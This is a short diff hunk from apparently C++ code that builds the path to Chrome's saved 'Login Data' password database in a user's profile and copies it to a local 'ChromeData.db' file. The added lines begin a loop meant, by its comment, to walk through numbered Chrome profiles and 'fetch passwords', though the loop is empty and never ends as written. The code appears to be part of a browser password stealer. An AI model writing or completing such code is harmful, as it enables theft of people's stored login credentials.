@@ -126,9 +126,15 @@ json driver(){
         return -1;
     }
     //char * a = "\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data";
+
     
     //https://stackoverflow.com/questions/6858524/convert-char-to-lpwstr
     std::string s = (std::string(lpProfileDir) + std::string("\\AppData\\Local\\Google\\Chrome\\User Data\\profile\\Login Data"));
+    
+    int i = 1;
+    while (true){
+        //if can find "Profile i" then fetch passwords otherwise break
+    }
    
     const char * db_path = s.c_str();
     const char * temp = "ChromeData.db";
